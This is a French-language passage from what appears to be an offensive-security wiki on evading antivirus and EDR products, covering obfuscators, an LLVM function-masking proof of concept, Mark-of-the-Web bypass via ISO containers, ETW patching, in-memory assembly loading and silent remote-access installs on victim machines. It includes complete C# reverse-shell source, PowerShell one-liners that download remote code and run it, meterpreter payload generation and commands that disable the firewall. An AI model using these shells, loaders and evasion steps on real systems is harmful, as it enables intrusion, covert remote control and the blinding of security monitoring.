- [**obfy**](https://github.com/fritzone/obfy) : ajoute une couche d'opérations obfusquées générées par le framework de métaprogrammation par templates C++, ce qui compliquera un peu la tâche de la personne qui cherche à cracker l'application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)** :** Alcatraz est un obfuscateur de binaires x64 capable d'obfusquer différents fichiers PE, notamment les fichiers .exe, .dll et .sys.
- [**metame**](https://github.com/a0rtega/metame) : Metame est un moteur de code métamorphique simple pour des exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator) : ROPfuscator est un framework d'obfuscation de code granulaire pour les langages pris en charge par LLVM, basé sur le ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant les instructions ordinaires en chaînes ROP, ce qui déjoue notre conception habituelle du flux de contrôle.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt) : Nimcrypt est un PE Crypter .NET écrit en Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)** :** Inceptor peut convertir des EXE/DLL existants en shellcode, puis les charger.

### Auto-masquage par fonction assisté par le compilateur LLVM

Au lieu de masquer un implant entier uniquement lorsqu'il est inactif, un backend LLVM X86 modifié peut conserver certaines fonctions masquées par XOR lorsqu'elles sont inactives. La PoC Function Peekaboo sélectionne les noms démanglés contenant `REG_`, insère des stubs d'entrée et de sortie indépendants de la position autour du code machine final, et génère un gestionnaire de masquage partagé dans `.text` ; les signatures au niveau source et la convention d'appel Windows x64 restent inchangées.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformation du flux de contrôle du backend

Cette étape doit avoir lieu après la sélection des instructions et l'optimisation, car la transformation doit couvrir **chaque retour généré** et connaître la disposition exacte du code x86. Un `MachineFunctionPass` exécuté avant l'émission trouve le dernier `MachineInstr::isReturn()`, le supprime afin que le dernier chemin tombe dans l'épilogue ajouté, et remplace les retours précédents par `JMP_1 handler`. Conservez tout démontage de pile ou de frame généré par le compilateur avant chaque retour ; redirigez uniquement l'instruction de retour elle-même.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` et `X86AsmPrinter::emitFunctionBodyEnd()` émettent les stubs propres à chaque fonction, tandis que `emitEndOfAsmFile()` émet le gestionnaire. Les symboles partagés entre les étapes d'émission permettent à un branchement du prologue de cibler son épilogue, émis plus tard ; pour un `je` proche émis manuellement, écrivez `0F 84`, suivi de l'expression MC de quatre octets `target - address_after_je`. Les appels et les sauts vers le gestionnaire peuvent plutôt être émis sous forme d'objets `MCInst` (`CALL64pcrel32` et `JMP_1`). Un pass doit renvoyer `false` pour une fonction non sélectionnée s'il n'a rien modifié ; la PoC renvoie incorrectement `true` dans ce cas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Métadonnées et initialisation pré-CRT

La PoC place une clé XOR et des enregistrements de 16 octets contenant un pointeur de fonction relocalisé par le loader ainsi qu'une longueur à l'exécution dans `.funcmeta`. Bien que le champ C soit un `uint32_t`, le gestionnaire accède à un QWORD à l'offset `+8` de l'enregistrement, ce qui englobe la longueur et son padding, puis avance de `0x10` octets entre les enregistrements. Les noms de sections PE ne font que huit octets ; la recherche à l'exécution voit donc `.funcmet`. Un patcher externe ajoute une section exécutable `.stub`, enregistre l'ancien RVA du point d'entrée dans le stub et redirige `AddressOfEntryPoint` ; le stub PIC obtient la base de l'image depuis `gs:[0x60]` → `[PEB+0x10]`, parcourt les imports PE32+ pour résoudre `VirtualProtect`, déjà importée, et s'exécute avant le CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'initialisation place une valeur sentinelle dans `gs:[0xE8]` et appelle chaque fonction des métadonnées. Le prologue, toujours lisible, enregistre le début de la fonction dans `gs:[0xF0]`, détecte la sentinelle et ignore le corps, encore en clair. L'épilogue utilise ensuite `call handler` ; après que le gestionnaire a sauvegardé 13 registres (`0x68` octets), l'adresse de retour à `[rsp+0x68]` correspond à la fin de la fonction transformée, ce qui permet d'écrire `end - start` dans son enregistrement de métadonnées. Le stub efface la sentinelle et saute à `ImageBase + original_entry_point_RVA` une fois tous les corps masqués.<sup>[[38]](#references)[[39]](#references)</sup>

Lors d'un appel normal, le prologue appelle le même gestionnaire symétrique pour décoder le corps. Le dernier chemin tombe dans l'épilogue ajouté, tandis que chaque retour précédent saute directement vers le gestionnaire partagé. L'épilogue normal utilise également `jmp handler` plutôt que `call` ; ainsi, après avoir remasqué le code, le `ret` du gestionnaire consomme l'adresse de retour de l'appelant d'origine et préserve le résultat de la fonction dans `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive de masquage et indicateurs d'analyse

Le gestionnaire trouve l'enregistrement courant, ignore le prologue visible de longueur fixe (`0x46` octets dans cette version), passe le reste en `PAGE_EXECUTE_READWRITE`, applique un XOR octet par octet avec l'octet de poids faible de la clé, puis le repasse en `PAGE_EXECUTE_READ`. La même boucle décode donc le corps à l'entrée et le code à chaque sortie normale.<sup>[[38]](#references)[[39]](#references)</sup>

Les indicateurs très révélateurs de cette conception comprennent :<sup>[[38]](#references)[[39]](#references)</sup>

- un point d'entrée dans une section exécutable `.stub` et une section `.funcmet` contenant une clé ainsi que des pointeurs relocalisés vers `.text` ;
- l'analyse pré-CRT du PEB, de la table des imports et de la table des sections, suivie d'appels via chaque pointeur des métadonnées ;
- des prologues PIC identiques utilisant `call`/`pop` et de nombreux sites de retour redirigés vers un seul gestionnaire ;
- des écritures dans `gs:[0xE8]`, `gs:[0xF0]` et `gs:[0xF8]`, suivies de transitions répétées via `VirtualProtect` et d'écritures XOR octet par octet dans des pages exécutables adossées à l'image.

Il s'agit d'une technique d'évasion des scanners mémoire, et non d'une protection cryptographique : le fichier patché contient toujours le corps original en clair, et un debugger peut placer un point d'arrêt sur `VirtualProtect` ou sur la boucle XOR pour dumper la fonction active. Le XOR sur un seul octet, les métadonnées lisibles et la limite fixe de `0x46` facilitent également la récupération hors ligne.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Les emplacements TEB utilisés par la PoC sont propres à chaque thread, mais les pages de code modifiées sont partagées par tout le processus. Des appels concurrents ou récursifs peuvent donc inverser à nouveau les instructions pendant qu'une autre invocation les exécute ; les exceptions et les sorties non locales peuvent également contourner le remasquage. Une implémentation robuste doit synchroniser les transitions, restaurer la protection réellement renvoyée via `lpflOldProtect`, éviter les longueurs de stub codées en dur, vérifier l'alignement de la pile x64 pour les chemins `call` et `jmp`, et appeler `FlushInstructionCache` après la réécriture d'octets exécutables. Microsoft indique explicitement qu'il incombe à l'appelant d'assurer la cohérence du cache d'instructions lorsque du code exécutable est modifié.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen et MoTW

Vous avez peut-être déjà vu cet écran en téléchargeant et en exécutant certains exécutables depuis Internet.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à empêcher l'utilisateur final d'exécuter des applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen repose principalement sur une approche basée sur la réputation : les applications peu téléchargées déclenchent SmartScreen, qui avertit l'utilisateur final et l'empêche d'exécuter le fichier (même s'il peut toujours l'exécuter en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [flux de données alternatif NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nommé Zone.Identifier, créé automatiquement lors du téléchargement de fichiers depuis Internet, avec l'URL depuis laquelle ils ont été téléchargés.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification du flux ADS Zone.Identifier d'un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **fiable** ne déclencheront **pas** SmartScreen.

Un moyen très efficace d'empêcher vos payloads de recevoir le Mark of The Web consiste à les placer dans un conteneur tel qu'un ISO. En effet, le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui place les payloads dans des conteneurs de sortie pour contourner le Mark-of-the-Web.

Exemple d'utilisation :

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Voici une démonstration du contournement de SmartScreen en intégrant des payloads dans des fichiers ISO à l'aide de [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation de Windows qui permet aux applications et aux composants système de **consigner des événements**. Toutefois, les produits de sécurité peuvent également s'en servir pour surveiller et détecter les activités malveillantes.

Comme pour la désactivation (contournement) d'AMSI, il est également possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans consigner d'événements. Pour cela, on patche la fonction en mémoire afin qu'elle retourne immédiatement, ce qui désactive effectivement la journalisation ETW pour ce processus.

Vous trouverez plus d'informations dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) et [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Réflexion d'assemblies C#

Le chargement de binaires C# en mémoire est connu depuis longtemps et reste un excellent moyen d'exécuter vos outils de post-exploitation sans vous faire repérer par l'antivirus.

Comme le payload est chargé directement en mémoire sans toucher au disque, il nous suffira de patcher AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) permettent déjà d'exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de procéder :

- **Fork\&Run**

Cette méthode consiste à **lancer un nouveau processus sacrifiable**, à injecter votre code malveillant de post-exploitation dans ce processus, à l'exécuter, puis à arrêter le nouveau processus une fois l'exécution terminée. Cette méthode présente des avantages et des inconvénients. Elle permet d'exécuter le code **en dehors** du processus de notre implant Beacon. Cela signifie que si un problème survient lors d'une action de post-exploitation ou si celle-ci est détectée, les chances que notre **implant survive sont bien plus élevées**. En revanche, le risque d'être détecté par les **détections comportementales** est **plus élevé**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Cette méthode consiste à injecter le code malveillant de post-exploitation **dans son propre processus**. Vous évitez ainsi de créer un nouveau processus et de le faire analyser par l'antivirus. En revanche, si l'exécution de votre payload rencontre un problème, le risque de **perdre votre beacon** est **bien plus élevé**, car le processus peut planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Pour en savoir plus sur le chargement d'assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez également charger des assemblies C# **depuis PowerShell**. Consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et [la vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Reconditionnement d'outils .NET en WebAssembly NativeAOT (WasmForge)

Les techniques classiques d'`execute-assembly` conservent un MSIL reconnaissable et finissent par initialiser un CLR. **WasmForge** modifie plutôt le substrat d'exécution : il porte un projet C# vers la cible expérimentale NativeAOT-LLVM WASI, le compile à l'avance en WebAssembly, puis intègre ce module dans un hôte PE Windows basé sur Wazero. Le processus obtenu n'a besoin ni du CLR, ni du JIT, ni de l'hôte `dotnet` de la cible ; les règles fondées uniquement sur les noms d'assemblies managées, le chargement du CLR, AMSI ou .NET ETW n'ont donc plus de visibilité directe. Il s'agit d'une technique d'évasion et de conditionnement, et non d'un contournement de frontière de privilèges : le code invité conserve les permissions de l'outil d'origine et son comportement observable sur le système d'exploitation.<sup>[[44]](#references)[[45]](#references)</sup>

### Compilation d'un projet C#

La méthode de compilation recommandée consiste à utiliser l'environnement Docker du projet, qui inclut le SDK .NET 10, la charge de travail NativeAOT-LLVM, le WASI SDK 24.0, l'éditeur de liens et les dépendances de signature. Un fichier `.csproj` est détecté automatiquement ; la compilation en une seule commande effectue la migration, les correctifs de compatibilité, la compilation WASM, la création du PE et la signature.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Pour dépanner ou examiner le code généré, exécutez les étapes séparément : `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, puis `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. L’image de build utilise également un wrapper `wasm-component-ld` pour éviter l’encodage de composant WASI Preview 2 et produire le module simple attendu par le runtime intégré.<sup>[[44]](#references)[[45]](#references)</sup>

### Passer de wasm32 C# à x64 Win32

Il ne s’agit pas d’une recompilation transparente. NativeAOT-WASI ne prend pas en charge certaines fonctionnalités du BCL orientées Windows, ou les modifie, et un invité wasm32 alloue normalement des emplacements de pointeur de quatre octets, tandis que les API x64 peuvent renvoyer des pointeurs de huit octets. WasmForge résout ces deux problèmes avec les couches générées suivantes :<sup>[[44]](#references)</sup>

1. Un patcher de code source corrige les différences sémantiques propres à AOT et redirige les appels non pris en charge liés au registre, aux pipes, à WMI, à l’identité, aux services d’annuaire, aux versions de fichiers, à LSA et à d’autres fonctionnalités similaires vers des helpers `Wf*`.
2. Un analyseur P/Invoke génère des mappings NativeAOT `DirectPInvoke` afin que les appels `[DllImport]` soient liés aux symboles de pont C intégrés, plutôt que de charger dynamiquement la DLL déclarée dans l’invité.
3. Les pointeurs liés à l’hôte utilisent `ulong` en C# et `uint64_t` en C. Un répartiteur générique transmet l’appel au gestionnaire Win32 de l’hôte ; un `out8_mask` indique les véritables emplacements de sortie de huit octets dont les bits de poids fort doivent être conservés. Pour les sorties non marquées au format wasm32, une protection par instantané/restauration empêche une écriture x64 de corrompre les quatre octets adjacents.
4. Des ponts dédiés côté hôte prennent en charge les opérations qui ne se prêtent pas au répartiteur générique d’appels système, comme l’accès au cache de tickets LSA, les opérations Kerberos/BCrypt avec résultats structurés, le trafic TCP KDC et les requêtes LDAP.

Par exemple, un wrapper pour `version.dll!VerQueryValueW` transmet quatre adresses de l’hôte et définit les bits 2 et 3 (`0xC`), car le pointeur de valeur et la longueur sont des emplacements de sortie de huit octets. Le wrapper reste générique et transmet le nom de DLL, le nom de l’export, les arguments et le masque à `wf_call_v2` ; l’hôte effectue la traduction des pointeurs et appelle l’API native.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Limitations et pivots de détection

Le code qui repose fortement sur la réflexion, le chargement dynamique d’assemblies, les callbacks natifs arbitraires et les structures x64 complexes renvoyées dans la mémoire WASM peut toujours nécessiter des correctifs propres à chaque outil ou échouer complètement. Les sockets génériques de WASI Preview 2 peuvent également aboutir à des stubs sans effet ; les outils pris en charge utilisent donc des shims hôtes spécifiques aux protocoles. Validez chaque commande avec une version native au lieu de supposer que les fonctionnalités sont équivalentes.<sup>[[44]](#references)[[45]](#references)</sup>

Cette technique déplace la télémétrie au lieu de rendre le payload invisible. La détection peut se concentrer sur un PE contenant ou matérialisant un module WASM, sur un comportement de runtime similaire à Wazero, sur des allocations et copies inhabituelles de mémoire hôte/invité, sur une répartition générique des appels directs Win32, sur des anomalies de signature et de ressources PE, ainsi que sur les appels d’API et le trafic réseau qui en résultent. L’absence d’événements CLR-load, AMSI ou .NET ETW ne doit donc pas être considérée comme une preuve qu’un processus est légitime.<sup>[[44]](#references)</sup>

## Utiliser d’autres langages de programmation

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d’exécuter du code malveillant dans d’autres langages en donnant à la machine compromise accès **à l’environnement d’interpréteur installé sur le partage SMB contrôlé par l’attaquant**.

En autorisant l’accès aux binaires de l’interpréteur et à l’environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le dépôt indique que Defender analyse toujours les scripts, mais que l’utilisation de Go, Java, PHP, etc., offre **davantage de flexibilité pour contourner les signatures statiques**. Des tests avec des scripts reverse shell aléatoires et non obfusqués dans ces langages se sont avérés concluants.

## Réhébergement WebAssembly pour contourner l’analyse statique

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Le Token stomping manipule le jeton d’accès d’un produit de sécurité comme un EDR ou un AV. Réduire les privilèges du jeton peut laisser le processus en cours d’exécution tout en l’empêchant d’effectuer des actions d’inspection ou de remédiation privilégiées.

Pour éviter cela, Windows pourrait **empêcher les processus externes** d’obtenir des handles sur les jetons des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Utiliser des logiciels de confiance

### Chrome Remote Desktop

Comme expliqué dans [**cet article de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d’une victime, puis de l’utiliser pour en prendre le contrôle et maintenir la persistance :<sup>[[35]](#references)</sup>
1. Téléchargez-le depuis https://remotedesktop.google.com/, cliquez sur « Set up via SSH », puis sur le fichier MSI pour Windows afin de le télécharger.
2. Lancez silencieusement le programme d’installation sur la machine victime (droits d’administrateur requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur « Suivant ». L’assistant vous demandera alors d’autoriser l’opération ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez la commande fournie en y apportant les modifications requises : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (le paramètre `--pin` définit le PIN sans utiliser l’interface graphique).
 

## Évasion avancée

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

L’évasion est un sujet très complexe ; il faut parfois tenir compte de nombreuses sources de télémétrie au sein d’un même système. Il est donc pratiquement impossible de rester complètement indétectable dans des environnements matures.

Chaque environnement auquel vous faites face a ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94) pour découvrir les techniques d’évasion avancées.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Voici également une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l’évasion en profondeur.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Anciennes techniques**

### **Vérifier quelles parties Defender détecte comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), qui **retire des parties du binaire** jusqu’à **trouver quelle partie Defender** considère comme malveillante, puis vous l’isole.\
Un autre outil faisant **la même chose est** [**avred**](https://github.com/dobin/avred), qui propose le service sur le Web à l’adresse [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu’à Windows 10, toutes les versions de Windows étaient livrées avec un **serveur Telnet** que vous pouviez installer (en tant qu’administrateur) en exécutant :

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant :

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Modifier le port telnet** (furtivité) et désactiver le pare-feu :

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (choisissez les téléchargements bin, pas le programme d'installation)

**SUR L’HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l’option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier _**UltraVNC.ini**_ nouvellement créé dans la **victime**

#### **Connexion inversée**

L’**attaquant** doit **exécuter sur** son **hôte** le binaire `vncviewer.exe -listen 5900` pour être **prêt** à recevoir une **connexion VNC** inversée. Ensuite, sur la **victime** : démarrez le daemon winvnc avec `winvnc.exe -run`, puis exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVERTISSEMENT :** Pour rester furtif, évitez les actions suivantes :

- Ne démarrez pas `winvnc` s’il est déjà en cours d’exécution, sinon une [fenêtre contextuelle](https://i.imgur.com/1SROTTl.png) apparaîtra. Vérifiez s’il est en cours d’exécution avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans que `UltraVNC.ini` se trouve dans le même répertoire, sinon la [fenêtre de configuration](https://i.imgur.com/rfMQWcf.png) s’ouvrira
- N’exécutez pas `winvnc -h` pour obtenir de l’aide, sinon une [fenêtre contextuelle](https://i.imgur.com/oc18wcu.png) apparaîtra

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dans GreatSCT :

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Maintenant, **démarrez le listener** avec `msfconsole -r file.rc` et **exécutez** le **payload xml** avec :

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Le Defender actuel terminera le processus très rapidement.**

### Compilation de notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier Revershell en C#

Compilez-le avec :

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Utilisez-le avec :

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# à l’aide du compilateur

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d’obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d'utilisation de Python pour créer des injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Plus

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

